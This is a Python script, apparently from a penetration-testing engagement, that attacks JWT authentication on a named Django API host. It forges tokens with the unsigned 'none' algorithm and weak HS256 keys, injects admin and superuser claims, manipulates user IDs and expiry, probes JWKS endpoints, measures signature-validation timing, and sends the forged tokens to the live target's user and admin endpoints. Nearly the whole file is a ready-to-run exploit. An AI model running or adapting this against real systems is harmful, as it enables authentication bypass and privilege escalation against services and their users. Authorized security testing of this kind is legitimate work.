#!/usr/bin/env python3
"""
JWT ELITE PARALLEL EXPLOITATION - 4 FRENTES SIMULT√ÇNEAS
Target: https://bkd.redahub.cloud (Django API)
Author: Neural-OffSec-Team
Date: 2025-11-15 17:54 BRT
Engagement: REDAHUB-web-wildcard
CVSS: TBD (depende da vulnerabilidade encontrada)

ESTRAT√âGIA:
- PARALELO 1: Algorithm Confusion (RS256 ‚Üí HS256, None algorithm)
- PARALELO 2: Claims Manipulation (is_staff, is_admin, role injection)
- PARALELO 3: JWKS Public Key Extraction + Key Confusion
- PARALELO 4: Token Timing Analysis (signature validation timing)

RUNTIME: 20 minutos m√°ximo
"""

import jwt
import json
import time
import requests
import hashlib
from typing import Optional, List, Dict, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================= CONFIG =============================
TARGET_BASE = "https://bkd.redahub.cloud"
TARGET_API = f"{TARGET_BASE}/api"
VERIFY_SSL = False
TIMEOUT = 10
MAX_WORKERS = 4  # 4 threads paralelos (1 por frente)

# Test credentials (se dispon√≠veis) - SUBSTITUIR COM CREDS V√ÅLIDAS SE TIVER
TEST_EMAIL = "test@example.com"
TEST_PASSWORD = "test123"

# ============================= COLORS =============================
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"

def print_success(msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
def print_error(msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
def print_info(msg): print(f"{Colors.CYAN}[*] {msg}{Colors.RESET}")
def print_warning(msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
def print_header(msg): print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}\n{msg}\n{'='*70}{Colors.RESET}\n")

# ============================ JWT UTILS ============================
class JWTExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = VERIFY_SSL
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Accept': 'application/json'
        })
        self.valid_token = None
        self.results = {
            'algorithm_confusion': [],
            'claims_manipulation': [],
            'key_confusion': [],
            'timing_attacks': []
        }

    def obtain_valid_token(self) -> Optional[str]:
        """Tenta obter um token JWT v√°lido via login"""
        print_header("FASE 0: OBTENDO TOKEN V√ÅLIDO")

        # Tentar endpoints de autentica√ß√£o conhecidos
        auth_endpoints = [
            f"{TARGET_API}/auth/login/",
            f"{TARGET_API}/auth/token/",
            f"{TARGET_API}/v1/auth/login/",
            f"{TARGET_API}/v1/auth/token/",
        ]

        for endpoint in auth_endpoints:
            print_info(f"Tentando: {endpoint}")
            try:
                resp = self.session.post(endpoint, json={
                    'email': TEST_EMAIL,
                    'password': TEST_PASSWORD
                }, timeout=TIMEOUT)

                if resp.status_code == 200:
                    data = resp.json()
                    token = data.get('access_token') or data.get('access') or data.get('token')
                    if token:
                        print_success(f"Token obtido: {token[:50]}...")
                        self.valid_token = token
                        return token
            except Exception as e:
                print_error(f"Erro: {e}")

        print_warning("N√£o foi poss√≠vel obter token v√°lido. Usando token de exemplo.")
        # Token de exemplo para demonstra√ß√£o
        example_payload = {
            "user_id": 1,
            "email": "test@redahub.cloud",
            "exp": int(time.time()) + 3600,
            "iat": int(time.time()),
        }
        token = jwt.encode(example_payload, key="secret", algorithm="HS256")
        self.valid_token = token
        return token

    # ===================== PARALELO 1: ALGORITHM CONFUSION =====================
    def attack_algorithm_confusion(self, token: str) -> List[Dict]:
        """PARALELO 1: Testa algorithm confusion"""
        print_header("PARALELO 1: ALGORITHM CONFUSION")
        results = []

        try:
            # Decode token sem verifica√ß√£o
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})

            original_alg = header.get('alg', 'UNKNOWN')
            print_info(f"Algoritmo original: {original_alg}")
            print_info(f"Payload original: {json.dumps(payload, indent=2)}")

            # TEST 1.1: None algorithm
            print_info("\n[1.1] Testando algorithm='none'")
            try:
                # Criar token com alg=none (sem assinatura)
                header_none = {"alg": "none", "typ": "JWT"}
                header_b64 = base64.urlsafe_b64encode(json.dumps(header_none).encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                token_none = f"{header_b64}.{payload_b64}."

                results.append({
                    'type': 'none_algorithm',
                    'token': token_none,
                    'description': 'JWT com algorithm=none (sem assinatura)'
                })
                print_success(f"Token 'none' criado: {token_none[:60]}...")
            except Exception as e:
                print_error(f"Erro ao criar token 'none': {e}")

            # TEST 1.2: HS256 com chaves fracas
            print_info("\n[1.2] Testando HS256 com chaves fracas")
            weak_keys = ["", "secret", "SECRET", "jwt_secret", "django_secret", "redahub", "REDAHUB", "password"]
            for key in weak_keys:
                try:
                    token_hs256 = jwt.encode(payload, key=key, algorithm="HS256")
                    results.append({
                        'type': f'hs256_weak_key_{key or "empty"}',
                        'token': token_hs256,
                        'key': key,
                        'description': f'HS256 com chave fraca: "{key}"'
                    })
                    print_success(f"Token HS256 (key='{key}'): {token_hs256[:60]}...")
                except Exception as e:
                    print_error(f"Erro com chave '{key}': {e}")

            # TEST 1.3: Case manipulation (alg vs ALG vs Alg)
            print_info("\n[1.3] Testando case manipulation do algoritmo")
            alg_variations = ["none", "None", "NONE", "nOnE"]
            for alg_var in alg_variations:
                try:
                    header_case = {"alg": alg_var, "typ": "JWT"}
                    header_b64 = base64.urlsafe_b64encode(json.dumps(header_case).encode()).decode().rstrip('=')
                    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                    token_case = f"{header_b64}.{payload_b64}."

                    results.append({
                        'type': f'case_manipulation_{alg_var}',
                        'token': token_case,
                        'description': f'Algorithm case variation: {alg_var}'
                    })
                    print_success(f"Token '{alg_var}': {token_case[:60]}...")
                except Exception as e:
                    print_error(f"Erro com '{alg_var}': {e}")

        except Exception as e:
            print_error(f"Erro geral em algorithm confusion: {e}")

        self.results['algorithm_confusion'] = results
        return results

    # ===================== PARALELO 2: CLAIMS MANIPULATION =====================
    def attack_claims_manipulation(self, token: str) -> List[Dict]:
        """PARALELO 2: Manipula√ß√£o de claims para privilege escalation"""
        print_header("PARALELO 2: CLAIMS MANIPULATION")
        results = []

        try:
            payload = jwt.decode(token, options={"verify_signature": False})

            # TEST 2.1: Admin elevation (todos os claims poss√≠veis)
            print_info("\n[2.1] Testando privilege escalation")
            admin_claims = {
                "is_staff": True,
                "is_superuser": True,
                "is_admin": True,
                "admin": True,
                "role": "admin",
                "user_type": "admin",
                "permissions": ["*"],
                "groups": ["admin", "superuser"],
            }

            payload_admin = payload.copy()
            payload_admin.update(admin_claims)

            # Criar com none algorithm
            token_admin_none = self._create_none_token(payload_admin)
            results.append({
                'type': 'admin_elevation_none',
                'token': token_admin_none,
                'payload': payload_admin,
                'description': 'Admin elevation com algorithm=none'
            })
            print_success(f"Token admin (none): {token_admin_none[:60]}...")

            # Criar com HS256 chaves fracas
            for key in ["", "secret", "redahub"]:
                try:
                    token_admin_hs = jwt.encode(payload_admin, key=key, algorithm="HS256")
                    results.append({
                        'type': f'admin_elevation_hs256_{key or "empty"}',
                        'token': token_admin_hs,
                        'payload': payload_admin,
                        'key': key,
                        'description': f'Admin elevation HS256 (key={key})'
                    })
                    print_success(f"Token admin HS256 (key='{key}'): {token_admin_hs[:60]}...")
                except Exception as e:
                    print_error(f"Erro: {e}")

            # TEST 2.2: User ID manipulation
            print_info("\n[2.2] Testando user_id manipulation")
            for user_id in [0, 1, 2, 999, -1, "admin"]:
                payload_userid = payload.copy()
                payload_userid['user_id'] = user_id
                token_userid = self._create_none_token(payload_userid)
                results.append({
                    'type': f'userid_manipulation_{user_id}',
                    'token': token_userid,
                    'payload': payload_userid,
                    'description': f'user_id alterado para {user_id}'
                })
                print_success(f"Token user_id={user_id}: {token_userid[:60]}...")

            # TEST 2.3: Expiration manipulation
            print_info("\n[2.3] Testando expira√ß√£o")
            # Token sem exp
            payload_no_exp = payload.copy()
            if 'exp' in payload_no_exp:
                del payload_no_exp['exp']
            token_no_exp = self._create_none_token(payload_no_exp)
            results.append({
                'type': 'no_expiration',
                'token': token_no_exp,
                'description': 'Token sem claim exp'
            })
            print_success(f"Token sem exp: {token_no_exp[:60]}...")

            # Token com exp muito futuro (10 anos)
            payload_future = payload.copy()
            payload_future['exp'] = int(time.time()) + (10 * 365 * 24 * 60 * 60)
            token_future = self._create_none_token(payload_future)
            results.append({
                'type': 'far_future_exp',
                'token': token_future,
                'description': 'Token expirando em 10 anos'
            })
            print_success(f"Token exp futuro: {token_future[:60]}...")

        except Exception as e:
            print_error(f"Erro em claims manipulation: {e}")

        self.results['claims_manipulation'] = results
        return results

    # ===================== PARALELO 3: KEY CONFUSION =====================
    def attack_key_confusion(self, token: str) -> List[Dict]:
        """PARALELO 3: JWKS extraction + Key confusion (RS256 ‚Üí HS256)"""
        print_header("PARALELO 3: KEY CONFUSION (JWKS Extraction)")
        results = []

        # TEST 3.1: Procurar JWKS publicamente
        print_info("\n[3.1] Procurando JWKS endpoints")
        jwks_paths = [
            "/.well-known/jwks.json",
            "/api/.well-known/jwks.json",
            "/api/auth/.well-known/jwks.json",
            "/api/v1/.well-known/jwks.json",
            "/.well-known/openid-configuration",
            "/api/.well-known/openid-configuration",
        ]

        for path in jwks_paths:
            url = f"{TARGET_BASE}{path}"
            try:
                print_info(f"Tentando: {url}")
                resp = self.session.get(url, timeout=TIMEOUT)
                if resp.status_code == 200:
                    print_success(f"JWKS encontrado!")
                    print_info(f"Content: {resp.text[:200]}...")
                    results.append({
                        'type': 'jwks_found',
                        'url': url,
                        'content': resp.text,
                        'description': 'JWKS endpoint p√∫blico encontrado'
                    })

                    # Se encontrar JWKS, tentar extrair chave p√∫blica
                    try:
                        jwks_data = resp.json()
                        print_info(f"JWKS parsed: {json.dumps(jwks_data, indent=2)}")
                        # Aqui voc√™ extrairia a chave p√∫blica e usaria como chave sim√©trica
                        # (implementa√ß√£o completa requer biblioteca cryptography)
                    except:
                        pass
            except Exception as e:
                print_error(f"Erro: {e}")

        if not results:
            print_warning("JWKS n√£o encontrado publicamente")
            print_info("Key confusion requer chave p√∫blica RSA do servidor")

        self.results['key_confusion'] = results
        return results

    # ===================== PARALELO 4: TIMING ATTACKS =====================
    def attack_timing_analysis(self, token: str) -> List[Dict]:
        """PARALELO 4: Timing attack na valida√ß√£o de assinatura"""
        print_header("PARALELO 4: TIMING ATTACK - Signature Validation")
        results = []

        print_info("Testando se valida√ß√£o de assinatura √© vulner√°vel a timing attacks")
        print_info("M√∫ltiplas tentativas com assinaturas diferentes para detectar delays")

        # Endpoint para testar (assumindo /api/auth/verify/)
        test_endpoints = [
            f"{TARGET_API}/auth/verify/",
            f"{TARGET_API}/v1/auth/verify/",
            f"{TARGET_API}/user/me/",
            f"{TARGET_API}/v1/user/me/",
        ]

        try:
            payload = jwt.decode(token, options={"verify_signature": False})

            # Criar m√∫ltiplos tokens com assinaturas ligeiramente diferentes
            print_info("\n[4.1] Gerando tokens com assinaturas variadas")
            test_tokens = []

            # Token v√°lido (baseline)
            test_tokens.append(('valid_token', token))

            # Tokens com assinaturas parcialmente corretas
            for i in range(10):
                fake_sig = hashlib.sha256(f"fake_signature_{i}".encode()).hexdigest()[:43]
                parts = token.split('.')
                if len(parts) == 3:
                    fake_token = f"{parts[0]}.{parts[1]}.{fake_sig}"
                    test_tokens.append((f'fake_sig_{i}', fake_token))

            # Testar timing em cada endpoint
            for endpoint in test_endpoints:
                print_info(f"\n[4.2] Testando timing em: {endpoint}")
                timing_results = []

                for name, test_token in test_tokens:
                    times = []
                    # 5 samples por token
                    for _ in range(5):
                        try:
                            start = time.time()
                            resp = self.session.post(endpoint,
                                                    json={'token': test_token},
                                                    headers={'Authorization': f'Bearer {test_token}'},
                                                    timeout=TIMEOUT)
                            elapsed = (time.time() - start) * 1000  # ms
                            times.append(elapsed)
                            time.sleep(0.1)  # Anti rate-limit
                        except:
                            times.append(-1)

                    avg_time = sum([t for t in times if t > 0]) / len([t for t in times if t > 0]) if any(t > 0 for t in times) else 0
                    timing_results.append((name, avg_time, times))
                    print_info(f"  {name}: avg={avg_time:.2f}ms times={[f'{t:.2f}' for t in times]}")

                # An√°lise estat√≠stica
                if timing_results:
                    valid_time = timing_results[0][1]  # baseline (token v√°lido)
                    fake_times = [r[1] for r in timing_results[1:] if r[1] > 0]

                    if fake_times:
                        avg_fake = sum(fake_times) / len(fake_times)
                        diff = abs(valid_time - avg_fake)

                        print_info(f"\n  An√°lise:")
                        print_info(f"    Token v√°lido: {valid_time:.2f}ms")
                        print_info(f"    Tokens fake (avg): {avg_fake:.2f}ms")
                        print_info(f"    Diferen√ßa: {diff:.2f}ms")

                        if diff > 50:  # >50ms diferen√ßa
                            print_warning(f"POSS√çVEL TIMING LEAK! Diferen√ßa significativa: {diff:.2f}ms")
                            results.append({
                                'type': 'timing_leak_detected',
                                'endpoint': endpoint,
                                'valid_time_ms': valid_time,
                                'fake_time_ms': avg_fake,
                                'difference_ms': diff,
                                'description': 'Diferen√ßa de timing detectada na valida√ß√£o'
                            })

        except Exception as e:
            print_error(f"Erro em timing attack: {e}")

        self.results['timing_attacks'] = results
        return results

    # ========================== HELPER METHODS ==========================
    def _create_none_token(self, payload: dict) -> str:
        """Cria token com algorithm=none (sem assinatura)"""
        import base64
        header = {"alg": "none", "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        return f"{header_b64}.{payload_b64}."

    # ========================== VALIDATION ==========================
    def validate_tokens(self):
        """Testa todos os tokens gerados em endpoints autenticados"""
        print_header("FASE FINAL: VALIDA√á√ÉO DE TOKENS")

        # Endpoints para testar
        test_endpoints = [
            f"{TARGET_API}/user/me/",
            f"{TARGET_API}/v1/user/me/",
            f"{TARGET_API}/admin/",
            f"{TARGET_API}/v1/admin/",
        ]

        # Coletar todos os tokens gerados
        all_tokens = []
        for attack_type, attack_results in self.results.items():
            for result in attack_results:
                if 'token' in result:
                    all_tokens.append((attack_type, result['type'], result['token']))

        print_info(f"Total de tokens para validar: {len(all_tokens)}")

        successes = []
        for attack_type, token_type, token in all_tokens[:20]:  # Limitar a 20 para n√£o demorar
            for endpoint in test_endpoints:
                try:
                    resp = self.session.get(endpoint,
                                          headers={'Authorization': f'Bearer {token}'},
                                          timeout=TIMEOUT)

                    if resp.status_code == 200:
                        print_success(f"SUCESSO! {attack_type}/{token_type} em {endpoint}")
                        print_info(f"Response: {resp.text[:200]}")
                        successes.append({
                            'attack': attack_type,
                            'token_type': token_type,
                            'endpoint': endpoint,
                            'response': resp.text
                        })
                except Exception as e:
                    pass  # Falha esperada

        if successes:
            print_success(f"\nüî• {len(successes)} TOKENS FUNCIONAIS ENCONTRADOS!")
            for s in successes:
                print_success(f"  - {s['attack']}/{s['token_type']} ‚Üí {s['endpoint']}")
        else:
            print_warning("Nenhum token manipulado foi aceito pelo servidor")

    # ========================== REPORT ==========================
    def generate_report(self):
        """Gera relat√≥rio final"""
        print_header("RELAT√ìRIO FINAL - JWT EXPLOITATION")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S BRT")

        print_info(f"Timestamp: {timestamp}")
        print_info(f"Target: {TARGET_BASE}")

        for attack_type, attack_results in self.results.items():
            print_info(f"\n{attack_type.upper().replace('_', ' ')}:")
            print_info(f"  Total de tentativas: {len(attack_results)}")

            # Destacar resultados positivos
            positives = [r for r in attack_results if 'found' in r.get('type', '') or 'detected' in r.get('type', '')]
            if positives:
                print_success(f"  ‚úì Resultados positivos: {len(positives)}")
                for p in positives:
                    print_success(f"    - {p.get('description', 'N/A')}")

        # Salvar relat√≥rio
        report_file = f"/Users/th3_w6rst/Neural-OffSec-Team/clients/REDAHUB/2025-11-06-REDAHUB-web-wildcard/04-evidence/15-11_17-54_jwt-exploitation-report.json"
        with open(report_file, 'w') as f:
            json.dump({
                'timestamp': timestamp,
                'target': TARGET_BASE,
                'results': self.results
            }, f, indent=2)
        print_success(f"\n‚úì Relat√≥rio salvo: {report_file}")

# ============================= MAIN =============================
def main():
    print_header("JWT ELITE PARALLEL EXPLOITATION - 4 FRENTES SIMULT√ÇNEAS")
    print_info("Target: https://bkd.redahub.cloud")
    print_info("Runtime: 20 minutos m√°ximo")
    print_info("Threads: 4 paralelos")

    exploiter = JWTExploiter()

    # FASE 0: Obter token v√°lido
    token = exploiter.obtain_valid_token()
    if not token:
        print_error("N√£o foi poss√≠vel obter token. Abortando.")
        return

    # PARALELO: Executar 4 ataques simult√¢neos
    print_header("INICIANDO 4 ATAQUES PARALELOS")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(exploiter.attack_algorithm_confusion, token): "Algorithm Confusion",
            executor.submit(exploiter.attack_claims_manipulation, token): "Claims Manipulation",
            executor.submit(exploiter.attack_key_confusion, token): "Key Confusion",
            executor.submit(exploiter.attack_timing_analysis, token): "Timing Attacks",
        }

        for future in as_completed(futures):
            attack_name = futures[future]
            try:
                result = future.result()
                print_success(f"‚úì {attack_name} completo ({len(result)} resultados)")
            except Exception as e:
                print_error(f"‚úó {attack_name} falhou: {e}")

    # VALIDA√á√ÉO: Testar tokens gerados
    exploiter.validate_tokens()

    # RELAT√ìRIO FINAL
    exploiter.generate_report()

    print_header("CONCLUS√ÉO")
    print_info("An√°lise JWT completa.")
    print_info("Pr√≥ximos passos:")
    print_info("  1. Revisar tokens funcionais (se houver)")
    print_info("  2. Testar em endpoints admin")
    print_info("  3. Documentar findings em FINDING-XXX-jwt-vulnerability.md")

if __name__ == "__main__":
    import base64  # Import necess√°rio
    main()
